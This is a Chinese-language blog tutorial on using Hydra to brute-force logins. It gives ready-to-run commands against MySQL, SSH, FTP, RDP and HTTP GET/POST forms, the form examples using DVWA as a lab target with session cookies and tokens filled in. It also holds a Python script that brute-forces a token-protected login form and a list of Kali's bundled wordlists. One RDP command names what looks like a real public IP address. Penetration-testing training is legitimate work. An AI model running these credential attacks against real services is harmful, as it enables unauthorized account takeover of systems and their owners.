

# hydra

是黑客组织thc的一款开源密码攻击工具，功能十分强大，支持多种协议的破解，在KALI的终端中执行hydra -h可以看到详细介绍

语法: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [[service://server[:PORT\][/OPT]]](service://server[:PORT][/OPT]])

## 常用参数

Options:
-R 继续从上一次进度接着破解
-I 忽略已破解的文件进行破解
-S 采用SSL链接
-s PORT 指定非默认服务端口
-l LOGIN 指定用户名破解
-L FILE 指定用户名字典
-p PASS 指定密码破解
-P FILE 指定密码字典
-y 爆破中不使用符号
-e nsr "n"尝试空密码, "s"尝试指定密码，"r"反向登录
-C FILE 使用冒号分割格式，例如"登录名:密码"来代替-L/-P参数
-M FILE 每行一条攻击的服务器列表, ':'指定端口
-o FILE 指定结果输出文件
-b FORMAT 为-o FILE输出文件指定输出格式:text(默认), json, jsonv1
-f / -F 找到登录名和密码时停止破解
-t TASKS 设置运行的线程数，默认是16
-w / -W TIME 设置最大超时的时间，单位秒，默认是30s
-c TIME 每次破解等待所有线程的时间
-4 / -6 使用IPv4(默认)或IPv6
-v / -V 显示详细过程
-q 不打印连接失败的信息
-U 服务模块详细使用方法
-h 更多命令行参数介绍
server 目标DNS、IP地址或一个网段
service 要破解的服务名
OPT 一些服务模块的可选参数

支持的协议: adam6500、asterisk、cisco、cisco-enable、cvs、firebird、ftp、ftps、http[s]-{head|get|post}、http[s]-{get|post}-form、http-proxy、http-proxy-urlenum、icq、imap[s]、irc、ldap2[s]、ldap3[-{cram|digest}md5][s]、mssql、mysql、nntp、oracle-listener、oracle-sid、pcanywhere、pcnfs、pop3[s]、postgres、radmin2、rdp、redis、rexec、rlogin、rpcap、rsh、rtsp、s7-300、sip、smb、smtp[s]、smtp-enum、snmp、socks5、ssh、sshkey、svn、teamspeak、telnet[s]、vmauthd、vnc、xmpp

这款工具在KALI中自带

L后面是账号集，P后面是密码集，注意大小写，大写代表文件。如果账号集中有m个账号，密码集中有n个密码，那么Hydra就会尝试m×n次爆破。

## 破解mysql

下面以mysql为例，写一条爆破指令，假如C:\Users\cjx路径下有账号集文件username.txt，有密码集文件password.txt，那么对某IP的mysql服务进行爆破的命令就可以这么写（C:\Users\cjx路径下打开命令行）：

`hydra -L username.txt -P password.txt mysql`://目标IP:mysql端口号
1
如果服务使用的是默认端口，那么指令也可以这么写：

hydra -L username.txt -P password.txt 目标IP mysql
1
如果需要将爆破的过程打印出来就加个指令-v





## 破解SSH

`hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 10.96.10.252 ssh   #-L指定用户字典 -P 指定密码字典  -o把成功的输出到ssh.txt文件 -vV显示详细信息`

## 破解FTP

`hydra -L user.txt -P passwd.txt -o ftp.txt -t 5 -vV 10.96.10.208 ftp `#-L指定用户名列表 -P指定密码字典 -o把爆破的输出到文件 -t指定线程 -vV 显示详细信息 

## 破解HTTP

我们拿DVWA测试破解HTTP，破解HTTP，需要分析数据包的提交格式

### GET方式：

分析数据包，我们得到下面的命令

`hydra -L user.txt -P passwd.txt -o http_get.txt -vV 10.96.10.208 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=nvvrgk2f84qhnh43cm28pt42n6; security=low" -t 3`
#前面那些参数就不说了，主要说一下引号里面的数据 /vulnerabilities/brute/ 代表请求目录，用：分隔参数，^USER^和^PASS^代表是攻击载荷，F=后面是代表密码错误时的关键字符串 ，H后面是cookie信息

### POST方式： 

分析数据包，得到下面的破解命令

`hydra -L user.txt -P passwd.txt -t 3 -o http_post.txt -vV 10.96.10.183 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=dd6bbcc4f4672afe99f15b1d2c249ea5:S=index.php"`
#前面那些参数就不说了，主要说一下引号里面的数据 /login.php 代表请求目录，用：分隔参数，^USER^和^PASS^代表是攻击载荷，S等于的是密码正确时返回应用的关键字符串
但是新版的DVWA采用了token的验证方式，每次登录的token都是不一样的，所以不能用hydra来破解。目前，大多数网站登录都采用了token验证，所以，都不能使用Hydra来破解。

我们可以自己写一个python脚本来破解。 

```
# -*- coding: utf-8 -*-

"""
Created on Sat Nov 24 20:42:01 2018
@author: 小谢
"""
import urllib
import requests
from bs4 import BeautifulSoup

##第一步，先访问 http://127.0.0.1/login.php页面，获得服务器返回的cookie和token
def get_cookie_token():
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Upgrade-Insecure-Requests':'1'}
    res=requests.get("http://127.0.0.1/login.php",headers=headers)
    cookies=res.cookies
    a=[(';'.join(['='.join(item)for item in cookies.items()]))]   ## a为列表，存储cookie和token
    html=res.text
    soup=BeautifulSoup(html,"html.parser")
    token=soup.form.contents[3]['value']
    a.append(token)
    return a 
##第二步模拟登陆
def Login(a,username,password):    #a是包含了cookie和token的列表
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Content-Length':'88',
             'Content-Type':'application/x-www-form-urlencoded',
             'Upgrade-Insecure-Requests':'1',
             'Cookie':a[0],
             'Referer':'http://127.0.0.1/login.php'}
    values={'username':username,
            'password':password,
            'Login':'Login',
            'user_token':a[1]
        }
    data=urllib.parse.urlencode(values)
    resp=requests.post("http://127.0.0.1/login.php",data=data,headers=headers)
    return 
#重定向到index.php
def main():
    with open("user.txt",'r') as f:
        users=f.readlines()
        for user in users:
            user=user.strip("\n")                 #用户名
            with open("passwd.txt",'r') as file:
                passwds=file.readlines()
                for passwd in passwds:
                    passwd=passwd.strip("\n")   #密码
                    a=get_cookie_token()              ##a列表中存储了服务器返回的cookie和toke
                    Login(a,user,passwd)
                    headers={'Host':'127.0.0.1',
                              'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                              'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                              'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                              'Connection':'keep-alive',
                              'Upgrade-Insecure-Requests':'1',
                              'Cookie':a[0],
                              'Referer':'http://127.0.0.1/login.php'}
                    response=requests.get("http://127.0.0.1/index.php",headers=headers)
                    if response.headers['Content-Length']=='7524':    #如果登录成功
                       print("用户名为：%s ,密码为：%s"%(user,passwd))   #打印出用户名和密码
                       break
if __name__=='__main__':
    main()
```

脚本运行截图



## 破解3389远程登录

`hydra 202.207.236.4 rdp -L user.txt -P passwd.txt -V`

Kali自带密码字典
暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带了一些字典，在 /usr/share/wordlists 目录下

dirb

big.txt #大的字典
small.txt #小的字典
catala.txt #项目配置字典
common.txt #公共字典
euskera.txt #数据目录字典
extensions_common.txt #常用文件扩展名字典
indexes.txt #首页字典
mutations_common.txt #备份扩展名
spanish.txt #方法名或库目录
others #扩展目录，默认用户名等
stress #压力测试
vulns #漏洞测试
dirbuster


apache-user-enum-** #apache用户枚举
directories.jbrofuzz #目录枚举
directory-list-1.0.txt #目录列表大，中，小 big，medium，small
fern-wifi


common.txt #公共wifi账户密码
metasploit
metasploit下有各种类型的字典



wfuzz
模糊测试，各种字典



https://blog.csdn.net/qq_36119192/article/details/84325850#dirb



